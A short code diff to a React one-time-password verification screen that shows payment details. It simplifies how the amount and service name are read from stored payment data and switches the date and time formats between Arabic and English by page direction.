@@ -25,8 +25,8 @@ export default function OTPVerification() {
   // Get payment data from localStorage
   const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
   const cardLast4 = paymentData.cardLast4 || "****";
-  const totalAmount = paymentData.totalPaid || localStorage.getItem('selectedPaymentAmount') || localStorage.getItem('selectedTotalAmount') || 0;
-  const serviceName = paymentData.serviceName || localStorage.getItem('selectedService') || "";
+  const totalAmount = paymentData.totalPaid || 0;
+  const serviceName = paymentData.serviceName || "";
   
   // Get card info from localStorage (fallback) or signal
   const signalCardInfo = waitingCardInfo.value;
@@ -132,7 +132,7 @@ export default function OTPVerification() {
 
   // Format date in Arabic
   const formatDate = (date: Date) => {
-    return date.toLocaleDateString("ar-SA", {
+    return date.toLocaleDateString((document.documentElement.dir==="ltr"?"en-US":"ar-SA"), {
       year: "numeric",
       month: "numeric",
       day: "numeric",
@@ -141,7 +141,7 @@ export default function OTPVerification() {
 
   // Format time in Arabic
   const formatTime = (date: Date) => {
-    return date.toLocaleTimeString("ar-SA", {
+    return date.toLocaleTimeString((document.documentElement.dir==="ltr"?"en-US":"ar-SA"), {
       hour: "2-digit",
       minute: "2-digit",
       second: "2-digit",
